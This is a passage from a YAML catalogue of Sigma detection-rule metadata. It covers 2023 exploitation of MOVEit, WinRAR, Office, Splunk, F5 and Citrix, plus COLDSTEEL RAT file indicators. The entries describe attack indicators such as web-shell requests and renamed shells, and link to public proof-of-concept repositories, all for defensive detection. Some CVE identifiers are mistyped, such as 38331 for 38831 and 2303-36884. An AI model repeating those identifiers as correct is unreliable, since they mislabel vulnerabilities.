  source_rule_path: external/sigma/rules-emerging-threats/2023/Exploits/CVE-2023-34362-MOVEit-Transfer-Exploit/proc_creation_win_exploit_cve_2023_34362_moveit_transfer_exploitation_activity.yml
  name: Potential MOVEit Transfer CVE-2023-34362 Exploitation - Dynamic Compilation
    Via Csc.EXE
  description: 'Detects the execution of "csc.exe" via "w3wp.exe" process. MOVEit
    affected hosts execute "csc.exe" via the "w3wp.exe" process to dynamically compile
    malicious DLL files.


    MOVEit is affected by a critical vulnerability. Exploited hosts show evidence
    of dynamically compiling a DLL and writing it under C:\\Windows\\Microsoft\.NET\\Framework64\\v4\.0\.30319\\Temporary
    ASP\.NET Files\\root\\([a-z0-9]{5,12})\\([a-z0-9]{5,12})\\App_Web_[a-z0-9]{5,12}\.dll.


    Hunting Opportunity


    Events from IIS dynamically compiling binaries via the csc.exe on behalf of the
    MOVEit application, especially since May 27th should be investigated.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  tags:
  - attack.execution
  - attack.t1059
  - cve.2023-34362
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.huntress.com/blog/moveit-transfer-critical-vulnerability-rapid-response
  - https://www.trustedsec.com/blog/critical-vulnerability-in-progress-moveit-transfer-technical-analysis-and-recommendations/
  false_positives:
  - Initial software installation and software updates.
  notes: ''
- detection_id: 435e41f2-48eb-4c95-8a2b-ed24b50ec30b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Exploits/CVE-2023-34362-MOVEit-Transfer-Exploit/web_cve_2023_34362_known_payload_request.yml.yml
  name: MOVEit CVE-2023-34362 Exploitation Attempt - Potential Web Shell Request
  description: Detects get requests to specific files used during the exploitation
    of MOVEit CVE-2023-34362
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1505.003
  tags:
  - attack.persistence
  - attack.t1505.003
  - cve.2023-34362
  - detection.emerging-threats
  time_window: ''
  references:
  - https://community.progress.com/s/article/MOVEit-Transfer-Critical-Vulnerability-31May2023
  - https://www.mandiant.com/resources/blog/zero-day-moveit-data-theft
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 92389a99-5215-43b0-a09f-e334453b2ed3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Exploits/CVE-2023-36874/file_event_win_exploit_cve_2023_36874_report_creation.yml
  name: Potential CVE-2023-36874 Exploitation - Uncommon Report.Wer Location
  description: Detects the creation of a "Report.wer" file in an uncommon folder structure.
    This could be a sign of potential exploitation of CVE-2023-36874.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  - cve.2023-36874
  - detection.emerging-threats
  time_window: ''
  references:
  - https://github.com/Wh04m1001/CVE-2023-36874
  - https://www.crowdstrike.com/blog/falcon-complete-zero-day-exploit-cve-2023-36874/
  false_positives:
  - Unknown
  notes: ''
- detection_id: ad0960eb-0015-4d16-be13-b3d9f18f1342
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Exploits/CVE-2023-36874/file_event_win_exploit_cve_2023_36874_wermgr_creation.yml
  name: Potential CVE-2023-36874 Exploitation - Fake Wermgr.Exe Creation
  description: Detects the creation of a file named "wermgr.exe" being created in
    an uncommon directory. This could be a sign of potential exploitation of CVE-2023-36874.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  - cve.2023-36874
  - detection.emerging-threats
  time_window: ''
  references:
  - https://github.com/Wh04m1001/CVE-2023-36874
  - https://www.crowdstrike.com/blog/falcon-complete-zero-day-exploit-cve-2023-36874/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 50dbc08b-60ce-40f1-a6b6-346497e34c88
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Exploits/CVE-2023-36874/proc_creation_win_exploit_cve_2023_36874_fake_wermgr.yml
  name: Potential CVE-2023-36874 Exploitation - Fake Wermgr Execution
  description: Detects the execution of a renamed "cmd", "powershell" or "powershell_ise"
    binary. Attackers were seen using these binaries in a renamed form as "wermgr.exe"
    in exploitation of CVE-2023-36874
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  - cve.2023-36874
  - detection.emerging-threats
  time_window: ''
  references:
  - https://github.com/Wh04m1001/CVE-2023-36874
  - https://www.crowdstrike.com/blog/falcon-complete-zero-day-exploit-cve-2023-36874/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 8023d3a2-dcdc-44da-8fa9-5c7906e55b38
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Exploits/CVE-2023-36884/file_event_win_exploit_cve_2023_36884_office_windows_html_rce_file_patterns.yml
  name: Potential CVE-2023-36884 Exploitation Dropped File
  description: Detects a specific file being created in the recent folder of Office.
    These files have been seen being dropped during potential exploitations of CVE-2023-36884
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.persistence
  - attack.defense-evasion
  - cve.2023-36884
  - detection.emerging-threats
  time_window: ''
  references:
  - https://blogs.blackberry.com/en/2023/07/romcom-targets-ukraine-nato-membership-talks-at-nato-summit
  - https://twitter.com/wdormann/status/1679184475677130755
  - https://twitter.com/r00tbsd/status/1679042071477338114/photo/1
  false_positives:
  - Unknown
  notes: ''
- detection_id: 0066d244-c277-4c3e-88ec-9e7b777cc8bc
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Exploits/CVE-2023-36884/proxy_exploit_cve_2023_36884_office_windows_html_rce.yml
  name: Potential CVE-2023-36884 Exploitation Pattern
  description: Detects a unique pattern seen being used by RomCom potentially exploiting
    CVE-2023-36884
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 7
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - distinct_or_novel_entity_logic
  severity: critical
  status: test
  platform: ''
  product: ''
  category: proxy
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.command-and-control
  - cve.2023-36884
  - detection.emerging-threats
  time_window: ''
  references:
  - https://blogs.blackberry.com/en/2023/07/romcom-targets-ukraine-nato-membership-talks-at-nato-summit
  false_positives:
  - Unknown
  notes: ''
- detection_id: d9365e39-febd-4a4b-8441-3ca91bb9d333
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Exploits/CVE-2023-36884/proxy_exploit_cve_2023_36884_office_windows_html_rce_extenstion_ip_pattern_traffic.yml
  name: Potential CVE-2303-36884 URL Request Pattern Traffic
  description: Detects a specific URL pattern containing a specific extension and
    parameters pointing to an IP address. This pattern was seen being used by RomCOM
    potentially exploiting CVE-2023-36884
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  severity: high
  status: test
  platform: ''
  product: ''
  category: proxy
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.command-and-control
  - cve.2023-36884
  - detection.emerging-threats
  time_window: ''
  references:
  - https://blogs.blackberry.com/en/2023/07/romcom-targets-ukraine-nato-membership-talks-at-nato-summit
  false_positives:
  - Unknown
  notes: ''
- detection_id: 6af1617f-c179-47e3-bd66-b28034a1052d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Exploits/CVE-2023-36884/proxy_exploit_cve_2023_36884_office_windows_html_rce_traffic.yml
  name: Potential CVE-2023-36884 Exploitation - File Downloads
  description: Detects files seen being requested by RomCom while potentially exploiting
    CVE-2023-36884
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  severity: medium
  status: test
  platform: ''
  product: ''
  category: proxy
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.command-and-control
  - cve.2023-36884
  - detection.emerging-threats
  time_window: ''
  references:
  - https://blogs.blackberry.com/en/2023/07/romcom-targets-ukraine-nato-membership-talks-at-nato-summit
  false_positives:
  - Unknown
  notes: ''
- detection_id: e59f71ff-c042-4f7a-8a82-8f53beea817e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Exploits/CVE-2023-36884/proxy_exploit_cve_2023_36884_office_windows_html_rce_url_marker_traffic.yml
  name: Potential CVE-2023-36884 Exploitation - URL Marker
  description: Detects a unique URL marker seen being used by RomCom potentially exploiting
    CVE-2023-36884
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 7
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: ''
  product: ''
  category: proxy
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.command-and-control
  - cve.2023-36884
  - detection.emerging-threats
  time_window: ''
  references:
  - https://blogs.blackberry.com/en/2023/07/romcom-targets-ukraine-nato-membership-talks-at-nato-summit
  false_positives:
  - Unknown
  notes: ''
- detection_id: 3df95076-9e78-4e63-accb-16699c3b74f8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Exploits/CVE-2023-36884/win_security_exploit_cve_2023_36884_office_windows_html_rce_share_access_pattern.yml
  name: Potential CVE-2023-36884 Exploitation - Share Access
  description: Detects access to a file share with a naming schema seen being used
    during exploitation of CVE-2023-36884
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.command-and-control
  - cve.2023-36884
  - detection.emerging-threats
  time_window: ''
  references:
  - https://blogs.blackberry.com/en/2023/07/romcom-targets-ukraine-nato-membership-talks-at-nato-summit
  false_positives:
  - Unknown
  notes: ''
- detection_id: e4556676-fc5c-4e95-8c39-5ef27791541f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Exploits/CVE-2023-38831/file_event_win_exploit_cve_2023_38331_winrar_susp_double_ext.yml
  name: CVE-2023-38331 Exploitation Attempt - Suspicious Double Extension File
  description: Detects the creation of a file with a double extension and a space
    by WinRAR. This could be a sign of exploitation of CVE-2023-38331
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  - cve.2023-38331
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.group-ib.com/blog/cve-2023-38831-winrar-zero-day/
  - https://github.com/knight0x07/WinRAR-Code-Execution-Vulnerability-CVE-2023-38831/blob/26ab6c40b6d2c09bb4fc60feaa4a3a90cfd20c23/Part-1-Overview.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: ec3a3c2f-9bb0-4a9b-8f4b-5ec386544343
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Exploits/CVE-2023-38831/proc_creation_win_exploit_cve_2023_38831_winrar_child_proc.yml
  name: CVE-2023-38331 Exploitation Attempt - Suspicious WinRAR Child Process
  description: Detects exploitation attempt of CVE-2023-38331 (WinRAR before v6.23),
    where an attacker can leverage WinRAR to execute arbitrary commands and binaries.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1203
  tags:
  - detection.emerging-threats
  - attack.execution
  - attack.t1203
  - cve.2023-38331
  time_window: ''
  references:
  - https://www.group-ib.com/blog/cve-2023-38831-winrar-zero-day/
  - https://github.com/knight0x07/WinRAR-Code-Execution-Vulnerability-CVE-2023-38831/blob/26ab6c40b6d2c09bb4fc60feaa4a3a90cfd20c23/Part-1-Overview.md
  false_positives:
  - Unlikely
  notes: ''
- detection_id: c3bd6c55-d495-4c34-918e-e03e8828c074
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Exploits/CVE-2023-40477/file_event_win_exploit_cve_2023_40477_winrar_rev_file_abuse.yml
  name: CVE-2023-40477 Potential Exploitation - .REV File Creation
  description: Detects the creation of ".rev" files by WinRAR. Could be indicative
    of potential exploitation of CVE-2023-40477. Look for a suspicious execution shortly
    after creation or a WinRAR application crash.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  - cve.2023-40477
  - detection.emerging-threats
  time_window: ''
  references:
  - https://wildptr.io/winrar-cve-2023-40477-poc-new-vulnerability-winrar-security-research/
  - https://github.com/wildptr-io/Winrar-CVE-2023-40477-POC
  - https://www.rarlab.com/vuln_rev3_names.html
  false_positives:
  - Legitimate extraction of multipart or recovery volumes ZIP files
  notes: ''
- detection_id: e5a29b54-6fe7-4258-8a23-82960e31231a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Exploits/CVE-2023-40477/win_application_exploit_cve_2023_40477_winrar_crash.yml
  name: CVE-2023-40477 Potential Exploitation - WinRAR Application Crash
  description: Detects a crash of "WinRAR.exe" where the version is lower than 6.23.
    This could indicate potential exploitation of CVE-2023-40477
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: application
  category: ''
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  - cve.2023-40477
  - detection.emerging-threats
  time_window: ''
  references:
  - https://wildptr.io/winrar-cve-2023-40477-poc-new-vulnerability-winrar-security-research/
  - https://github.com/wildptr-io/Winrar-CVE-2023-40477-POC
  - https://www.rarlab.com/vuln_rev3_names.html
  false_positives:
  - Legitimate crash for reasons other than exploitation of the vulnerability
  notes: ''
- detection_id: f48f5368-355c-4a1b-8bf5-11c13d589eaa
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Exploits/CVE-2023-43261/proxy_exploit_cve_2023_43261_milesight_information_disclosure.yml
  name: Potential Information Disclosure CVE-2023-43261 Exploitation - Proxy
  description: 'Detects exploitation attempts of CVE-2023-43261 and information disclosure
    in Milesight UR5X, UR32L, UR32, UR35, UR41 before v35.3.0.7 that allows attackers
    to access sensitive router components in proxy logs.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: ''
  product: ''
  category: proxy
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  - cve.2023-43621
  - detection.emerging-threats
  time_window: ''
  references:
  - https://thehackernews.com/2023/10/experts-warn-of-severe-flaws-affecting.html
  - https://medium.com/@win3zz/inside-the-router-how-i-accessed-industrial-routers-and-reported-the-flaws-29c34213dfdf
  - https://github.com/win3zz/CVE-2023-43261
  - https://vulncheck.com/blog/real-world-cve-2023-43261
  false_positives:
  - Unknown
  notes: ''
- detection_id: a2bcca38-9f3a-4d5e-b603-0c587e8569d7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Exploits/CVE-2023-43261/web_exploit_cve_2023_43261_milesight_information_disclosure.yml
  name: Potential Information Disclosure CVE-2023-43261 Exploitation - Web
  description: 'Detects exploitation attempts of CVE-2023-43261 and information disclosure
    in Milesight UR5X, UR32L, UR32, UR35, UR41 before v35.3.0.7 that allows attackers
    to access sensitive router components in access logs.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  - cve.2023-43621
  - detection.emerging-threats
  time_window: ''
  references:
  - https://thehackernews.com/2023/10/experts-warn-of-severe-flaws-affecting.html
  - https://medium.com/@win3zz/inside-the-router-how-i-accessed-industrial-routers-and-reported-the-flaws-29c34213dfdf
  - https://github.com/win3zz/CVE-2023-43261
  - https://vulncheck.com/blog/real-world-cve-2023-43261
  false_positives:
  - Unknown
  notes: ''
- detection_id: 04017cd5-621e-4ec4-a762-1f042fe3d3e5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Exploits/CVE-2023-46214/web_cve_2023_46214_rce_splunk_enterprise.yml
  name: Potential CVE-2023-46214 Exploitation Attempt
  description: 'Detects potential exploitation of CVE-2023-46214, a remote code execution
    (RCE) in Splunk Enterprise through insecure XML parsing

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  severity: medium
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics: []
  techniques:
  - T1210
  tags:
  - attack.lateral-movement
  - attack.t1210
  - cve.2023-46214
  - detection.emerging-threats
  time_window: ''
  references:
  - https://github.com/nathan31337/Splunk-RCE-poc/
  - https://blog.hrncirik.net/cve-2023-46214-analysis
  - https://advisory.splunk.com/advisories/SVD-2023-1104
  false_positives:
  - Unknown
  notes: ''
- detection_id: ba5268de-4dd4-4d5c-8a90-2b5e6dc1aff8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Exploits/CVE-2023-46214/web_cve_2023_46214_rce_splunk_enterprise_poc.yml
  name: Exploitation Attempt Of CVE-2023-46214 Using Public POC Code
  description: 'Detects exploitation attempt of CVE-2023-46214, a remote code execution
    (RCE) in Splunk Enterprise through insecure XML parsing using known public proof
    of concept code

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  severity: high
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics: []
  techniques:
  - T1210
  tags:
  - attack.lateral-movement
  - attack.t1210
  - cve.2023-46214
  - detection.emerging-threats
  time_window: ''
  references:
  - https://github.com/nathan31337/Splunk-RCE-poc/
  - https://blog.hrncirik.net/cve-2023-46214-analysis
  - https://advisory.splunk.com/advisories/SVD-2023-1104
  false_positives:
  - Unlikely
  notes: ''
- detection_id: f195b2ff-e542-41bf-8d91-864fb81e5c20
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Exploits/CVE-2023-46747/proxy_cve_2023_46747_f5_remote_code_execution.yml
  name: CVE-2023-46747 Exploitation Activity - Proxy
  description: Detects exploitation activity of CVE-2023-46747 an unauthenticated
    remote code execution vulnerability in F5 BIG-IP.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - sequence_or_progression_logic
  severity: high
  status: test
  platform: ''
  product: ''
  category: proxy
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  - cve.2023-46747
  - detection.emerging-threats
  time_window: ''
  references:
  - https://github.com/AliBrTab/CVE-2023-46747-POC/tree/main
  - https://github.com/0xorOne/nuclei-templates/blob/2fef4270ec6e5573d0a1732cb18bcfc4b1580a88/http/cves/2023/CVE-2023-46747.yaml
  - https://mp.weixin.qq.com/s/wUoBy7ZiqJL2CUOMC-8Wdg
  - https://www.praetorian.com/blog/refresh-compromising-f5-big-ip-with-request-smuggling-cve-2023-46747/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: e9928831-ba14-42ea-a4bc-33d352b9929a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Exploits/CVE-2023-46747/web_cve_2023_46747_f5_remote_code_execution.yml
  name: CVE-2023-46747 Exploitation Activity - Webserver
  description: Detects exploitation activity of CVE-2023-46747 an unauthenticated
    remote code execution vulnerability in F5 BIG-IP.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - sequence_or_progression_logic
  severity: high
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  - cve.2023-46747
  - detection.emerging-threats
  time_window: ''
  references:
  - https://github.com/AliBrTab/CVE-2023-46747-POC/tree/main
  - https://github.com/0xorOne/nuclei-templates/blob/2fef4270ec6e5573d0a1732cb18bcfc4b1580a88/http/cves/2023/CVE-2023-46747.yaml
  - https://mp.weixin.qq.com/s/wUoBy7ZiqJL2CUOMC-8Wdg
  - https://www.praetorian.com/blog/refresh-compromising-f5-big-ip-with-request-smuggling-cve-2023-46747/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: aee7681f-b53d-4594-a9de-ac51e6ad3362
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Exploits/CVE-2023-4966/proxy_exploit_cve_2023_4966_citrix_sensitive_information_disclosure_exploit.yml
  name: CVE-2023-4966 Exploitation Attempt - Citrix ADC Sensitive Information Disclosure
    - Proxy
  description: Detects exploitation attempt of CVE-2023-4966 a Citrix ADC and NetScaler
    Gateway sensitive information disclosure vulnerability via proxy logs by looking
    for a very long host header string.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: ''
  product: ''
  category: proxy
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  - cve.2023-4966
  - detection.emerging-threats
  time_window: ''
  references:
  - https://support.citrix.com/article/CTX579459/netscaler-adc-and-netscaler-gateway-security-bulletin-for-cve20234966-and-cve20234967
  - https://attackerkb.com/topics/2faW2CxJgQ/cve-2023-4966
  - https://www.rapid7.com/blog/post/2023/10/25/etr-cve-2023-4966-exploitation-of-citrix-netscaler-information-disclosure-vulnerability/
  - https://www.assetnote.io/resources/research/citrix-bleed-leaking-session-tokens-with-cve-2023-4966
  - https://github.com/assetnote/exploits/tree/main/citrix/CVE-2023-4966
  false_positives:
  - Vulnerability scanners
  notes: ''
- detection_id: ff349b81-617f-4af4-924f-dbe8ea9bab41
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Exploits/CVE-2023-4966/proxy_exploit_cve_2023_4966_citrix_sensitive_information_disclosure_exploit_attempt.yml
  name: CVE-2023-4966 Potential Exploitation Attempt - Citrix ADC Sensitive Information
    Disclosure - Proxy
  description: Detects potential exploitation attempt of CVE-2023-4966 a Citrix ADC
    and NetScaler Gateway sensitive information disclosure vulnerability via proxy
    logs.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: ''
  product: ''
  category: proxy
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  - cve.2023-4966
  - detection.emerging-threats
  time_window: ''
  references:
  - https://support.citrix.com/article/CTX579459/netscaler-adc-and-netscaler-gateway-security-bulletin-for-cve20234966-and-cve20234967
  - https://attackerkb.com/topics/2faW2CxJgQ/cve-2023-4966
  - https://www.rapid7.com/blog/post/2023/10/25/etr-cve-2023-4966-exploitation-of-citrix-netscaler-information-disclosure-vulnerability/
  - https://www.assetnote.io/resources/research/citrix-bleed-leaking-session-tokens-with-cve-2023-4966
  - https://github.com/assetnote/exploits/tree/main/citrix/CVE-2023-4966
  false_positives:
  - Vulnerability scanners
  notes: ''
- detection_id: 87c83d8e-5390-44ce-aa4a-d3b37e54d0a0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Exploits/CVE-2023-4966/web_exploit_cve_2023_4966_citrix_sensitive_information_disclosure_exploit.yml
  name: CVE-2023-4966 Potential Exploitation Attempt - Citrix ADC Sensitive Information
    Disclosure - Webserver
  description: Detects potential exploitation attempt of CVE-2023-4966 a Citrix ADC
    and NetScaler Gateway sensitive information disclosure vulnerability via webserver
    logs.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  - cve.2023-4966
  - detection.emerging-threats
  time_window: ''
  references:
  - https://support.citrix.com/article/CTX579459/netscaler-adc-and-netscaler-gateway-security-bulletin-for-cve20234966-and-cve20234967
  - https://attackerkb.com/topics/2faW2CxJgQ/cve-2023-4966
  - https://www.rapid7.com/blog/post/2023/10/25/etr-cve-2023-4966-exploitation-of-citrix-netscaler-information-disclosure-vulnerability/
  - https://www.assetnote.io/resources/research/citrix-bleed-leaking-session-tokens-with-cve-2023-4966
  - https://github.com/assetnote/exploits/tree/main/citrix/CVE-2023-4966
  false_positives:
  - Vulnerability scanners
  notes: ''
- detection_id: a4e068b5-e27c-4f21-85b3-e69e5a4f7ce1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Exploits/CVE-2023-4966/web_exploit_cve_2023_4966_citrix_sensitive_information_disclosure_exploit_attempt.yml
  name: CVE-2023-4966 Exploitation Attempt - Citrix ADC Sensitive Information Disclosure
    - Webserver
  description: Detects exploitation attempt of CVE-2023-4966 a Citrix ADC and NetScaler
    Gateway sensitive information disclosure vulnerability via webserver logs by looking
    for a very long host header string.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  - cve.2023-4966
  - detection.emerging-threats
  time_window: ''
  references:
  - https://support.citrix.com/article/CTX579459/netscaler-adc-and-netscaler-gateway-security-bulletin-for-cve20234966-and-cve20234967
  - https://attackerkb.com/topics/2faW2CxJgQ/cve-2023-4966
  - https://www.rapid7.com/blog/post/2023/10/25/etr-cve-2023-4966-exploitation-of-citrix-netscaler-information-disclosure-vulnerability/
  - https://www.assetnote.io/resources/research/citrix-bleed-leaking-session-tokens-with-cve-2023-4966
  - https://github.com/assetnote/exploits/tree/main/citrix/CVE-2023-4966
  false_positives:
  - Vulnerability scanners
  notes: ''
- detection_id: 6d5b8176-d87d-4402-8af4-53aee9db7b5d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Exploits/Windows-Server-Unknown-Exploit/proc_creation_win_exploit_other_win_server_undocumented_rce.yml
  name: Potential Exploitation Attempt Of Undocumented WindowsServer RCE
  description: Detects potential exploitation attempt of undocumented Windows Server
    Pre Auth Remote Code Execution (RCE)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  - detection.emerging-threats
  time_window: ''
  references:
  - https://github.com/SigmaHQ/sigma/pull/3946
  - https://twitter.com/hackerfantastic/status/1616455335203438592?s=20
  false_positives:
  - Unknown
  notes: ''
- detection_id: c708a93f-46b4-4674-a5b8-54aa6219c5fa
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Malware/COLDSTEEL/file_event_win_malware_coldsteel_renamed_cmd.yml
  name: Potential COLDSTEEL RAT File Indicators
  description: Detects the creation of a file named "dllhost.exe" in the "C:\users\public\Documents\"
    directory. Seen being used by the COLDSTEEL RAT in some of its variants.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.persistence
  - attack.defense-evasion
  - detection.emerging-threats
  time_window: ''
  references:
